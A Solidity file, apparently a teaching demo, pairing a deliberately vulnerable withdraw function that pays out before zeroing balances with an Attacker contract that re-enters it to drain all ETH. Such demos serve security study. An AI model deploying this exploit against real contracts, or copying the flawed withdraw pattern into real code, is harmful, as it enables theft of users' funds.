//SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {console} from "hardhat/console.sol";

contract Reentrant {
    error Reentrant__insufficientBalance();
    error Reentrant__callFailed();

    // Store user balances
    mapping(address user => uint256 balance) private s_balances;

    // Add ETH to the smart-contract
    function deposit() external payable {
        s_balances[msg.sender] += msg.value;
    }

    // Reentrant!
    function withdraw() external {
        uint256 balance = s_balances[msg.sender];
        if (balance == 0) revert Reentrant__insufficientBalance();

        (bool success, ) = payable(msg.sender).call{value: balance}("");
        if (!success) revert Reentrant__callFailed();

        s_balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    error Attacker__notAnOwner();
    error Attacker__notProfitableAttack();
    error Attacker__notAVictim();

    address payable private immutable i_owner;
    Reentrant private immutable i_victim;

    uint256 depositedValue;

    constructor(Reentrant victim) {
        i_owner = payable(msg.sender);
        i_victim = victim;
    }

    function attack() external payable {
        if (msg.sender != i_owner) revert Attacker__notAnOwner();
        if (address(i_victim).balance < msg.value)
            revert Attacker__notProfitableAttack();

        depositedValue = msg.value;
        i_victim.deposit{value: msg.value}();

        i_victim.withdraw();
    }

    receive() external payable {
        if (msg.sender != address(i_victim)) revert Attacker__notAVictim();

        if (address(i_victim).balance >= depositedValue) i_victim.withdraw();
        else selfdestruct(i_owner);
    }
}
